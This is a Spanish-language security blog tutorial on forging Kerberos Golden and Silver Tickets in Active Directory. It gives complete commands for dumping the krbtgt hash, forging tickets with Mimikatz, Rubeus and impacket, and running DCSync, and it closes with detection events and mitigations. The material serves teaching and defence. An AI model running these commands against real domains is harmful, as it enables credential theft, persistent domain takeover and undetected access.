---
layout: single
title: "Golden Ticket y Silver Ticket: forjando Kerberos en Active Directory"
date: 2026-07-25
categories: [writeups, tutoriales]
tags: [active-directory, kerberos, golden-ticket, silver-ticket, mimikatz, rubeus, impacket, post-explotacion]
excerpt: "Cómo un atacante con el hash de krbtgt puede firmar tickets Kerberos arbitrarios y moverse libremente por el dominio — sin tocar ninguna cuenta de usuario."
permalink: /tutoriales/golden-ticket-silver-ticket-kerberos-forging/
---

El post de [Kerberoasting](/writeups/kerberoasting-asreproasting-active-directory/) explicaba cómo extraer hashes de cuentas de servicio para crackearlos offline. Los ataques de Golden y Silver Ticket son la cara opuesta: en lugar de robar credenciales, directamente **falsificamos** los tickets que el KDC emitiría. Si tienes el hash de `krbtgt`, el dominio entero es tuyo.

## Kerberos en 90 segundos

Para entender el ataque hay que tener claro el flujo normal:

1. **AS-REQ / AS-REP**: el cliente pide un Ticket Granting Ticket (TGT) al Authentication Service. El KDC lo firma con el hash de `krbtgt`.
2. **TGS-REQ / TGS-REP**: el cliente presenta el TGT para obtener un Service Ticket (ST) hacia un servicio concreto (CIFS, HTTP, MSSQL…). El KDC firma el ST con el hash de la cuenta de servicio.
3. **AP-REQ**: el cliente presenta el ST al servicio. El servicio lo descifra con su propio hash y concede acceso.

El punto crítico: **el KDC no verifica** si el usuario mencionado en el TGT existe realmente ni si tiene los grupos que dice tener. Solo verifica la firma HMAC. Quien controla la clave de firma, controla el token.

## Golden Ticket

### Qué es

Un Golden Ticket es un TGT forjado y firmado con el hash NTLM de `krbtgt`. Puede contener cualquier SID, cualquier grupo (incluido Domain Admins), cualquier nombre de usuario, y tiene la validez que el atacante quiera ponerle.

### Prerrequisitos

- Hash NTLM de `krbtgt` (requiere haber comprometido un DC o volcado el NTDS.dit)
- Domain SID
- Nombre del dominio

El SID del dominio se obtiene con cualquier cuenta:

```powershell
Get-ADDomain | Select-Object DomainSID
```

O con impacket desde Linux:

```bash
lookupsid.py 'CORP/administrator:Password123!'@dc01.corp.local 0
```

### Extracción del hash de krbtgt

Con `secretsdump` de impacket apuntando al DC:

```bash
secretsdump.py 'CORP/administrator:Password123!'@dc01.corp.local -just-dc-user krbtgt
```

Salida relevante:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
CORP\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c4c5a6d3f1b8e2944abc012345678901:::
```

### Forja con Mimikatz

```
mimikatz # kerberos::golden /user:hacker /domain:corp.local /sid:S-1-5-21-1234567890-9876543210-1122334455 /krbtgt:c4c5a6d3f1b8e2944abc012345678901 /groups:512 /ptt
```

Parámetros clave:

| Flag | Descripción |
|------|-------------|
| `/user` | Nombre arbitrario (puede no existir en AD) |
| `/sid` | SID del dominio |
| `/krbtgt` | Hash NTLM de krbtgt |
| `/groups` | RIDs de grupos a incluir (512 = Domain Admins) |
| `/ptt` | Pass-the-Ticket: inyecta en sesión actual |
| `/startoffset` | Offset de inicio en minutos (negativo = backdated) |
| `/endin` | Duración en minutos (default: 10 años) |

Después de `/ptt`, verifica con:

```
mimikatz # kerberos::list
klist
```

Y accede a cualquier recurso del dominio:

```powershell
dir \\dc01.corp.local\c$
Enter-PSSession -ComputerName dc01.corp.local
```

### Forja con Rubeus (Windows)

```powershell
.\Rubeus.exe golden /user:hacker /domain:corp.local /sid:S-1-5-21-... /rc4:c4c5a6d3f1b8e2944abc012345678901 /groups:512,519 /ptt
```

### Forja con impacket (Linux)

```bash
ticketer.py -nthash c4c5a6d3f1b8e2944abc012345678901 \
  -domain-sid S-1-5-21-1234567890-9876543210-1122334455 \
  -domain corp.local \
  -groups 512,519 \
  hacker

export KRB5CCNAME=hacker.ccache
secretsdump.py -k -no-pass dc01.corp.local
```

## Silver Ticket

### Diferencia con Golden

El Silver Ticket forja un **Service Ticket** (no un TGT) directamente, firmado con el hash de la cuenta de servicio en lugar del hash de `krbtgt`. Esto significa:

- **No toca el KDC** en absoluto — el ticket va directamente al servicio
- El KDC no puede detectarlo porque nunca lo ve
- Requiere el hash de la cuenta de servicio (no de krbtgt)
- Limitado a los servicios de esa cuenta concreta

### Cuándo es útil

Si has comprometido una cuenta de servicio con altos privilegios locales (por ejemplo, una cuenta que corre SQL Server en múltiples máquinas), puedes forjar STs para ese servicio sin necesitar acceso al DC.

### SPNs comunes como objetivo

| SPN | Servicio |
|-----|----------|
| `cifs/servidor.corp.local` | SMB / compartidos |
| `host/servidor.corp.local` | WMI, PsExec, tareas programadas |
| `http/servidor.corp.local` | IIS |
| `mssqlsvc/servidor.corp.local:1433` | SQL Server |
| `ldap/dc01.corp.local` | DCSync, consultas LDAP |

### Forja con Mimikatz

```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... \
  /target:sqlserver.corp.local \
  /service:mssqlsvc \
  /rc4:a87f3a337d73085c45f9416be5787d86 \
  /ptt
```

La diferencia respecto al Golden Ticket es `/target` y `/service`: especifican el host y el tipo de servicio para el que es válido el ticket. El `/rc4` aquí es el hash de la cuenta que corre el SQL Server, no el de krbtgt.

Acceso inmediato:

```bash
# Verificar que el ticket está en memoria
klist

# Conectar al SQL Server sin credenciales
sqlcmd -S sqlserver.corp.local -Q "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"
```

### Silver Ticket hacia LDAP (DCSync sin DA)

Si tienes el hash de la cuenta de máquina del DC (`DC01$`), puedes forjar un ST para LDAP y ejecutar un DCSync:

```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... \
  /target:dc01.corp.local \
  /service:ldap \
  /rc4:<hash_DC01$> \
  /ptt
```

```
mimikatz # lsadump::dcsync /user:krbtgt
```

## Persistencia a largo plazo

La clave de persistencia del Golden Ticket es que **cambiar la contraseña del usuario no invalida el ticket forjado**. El ticket está firmado por krbtgt, y mientras el hash de krbtgt no cambie, el ticket sigue siendo válido aunque el usuario "hacker" no exista.

Para eliminar un Golden Ticket del entorno hay que rotar el hash de krbtgt **dos veces** (existe el hash actual y el anterior, y el KDC acepta ambos):

```powershell
# Rotar krbtgt — hay que hacerlo dos veces con intervalo
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NuevaClave1!" -Force)
# Esperar replicación entre DCs, luego:
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NuevaClave2!" -Force)
```

Microsoft ofrece el script [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1) para hacer esto de forma controlada.

## Detección

### Eventos de Windows relevantes

| Event ID | Descripción |
|----------|-------------|
| 4769 | Kerberos Service Ticket Request — anomalías en campos de cifrado (RC4 donde se esperaba AES) |
| 4624 | Logon — tickets con lifetimes anómalos |
| 4672 | Special privileges assigned — si el usuario forjado no existe en AD |
| 4768 | Kerberos TGT Request — ausencia de este evento cuando debería existir (Silver Ticket no genera 4768 ni 4769 en el DC) |

El Silver Ticket es especialmente difícil de detectar porque **no genera eventos en el DC**. Solo aparece en los logs del servidor de destino (event 4624 con logon type 3).

### Indicadores de compromiso

- Tickets con `etype` 0x17 (RC4-HMAC) cuando el entorno usa AES exclusivamente
- Usuarios con membresía a grupos de alto privilegio que no existen en AD (`Get-ADUser` devuelve null)
- Tickets con validez superior a 10 horas (Kerberos default: 10h renovables hasta 7 días)
- Fuente de autenticación sin TGT previo (Silver Ticket)

### Mitigación

- Habilitar **Protected Users Security Group** para cuentas privilegiadas: fuerza AES y deshabilita delegación Kerberos
- Activar **Credential Guard** en DCs y estaciones de administración
- Rotar krbtgt regularmente (no basta una sola rotación)
- Desplegar **Microsoft Defender for Identity** (antes ATA): detecta anomalías en tickets Kerberos

## Referencias

- [Gentilkiwi — Pass-the-ticket, Golden Ticket](https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-golden-tickets)
- [harmj0y — The Secret Life of Krbtgt](http://www.harmj0y.net/blog/activedirectory/the-secret-life-of-krbtgt/)
- [SpecterOps — Kerberos Attacks Explained](https://posts.specterops.io/kerberos-attacks-explained-2023-edition)
- [Microsoft — Event ID 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [impacket — ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
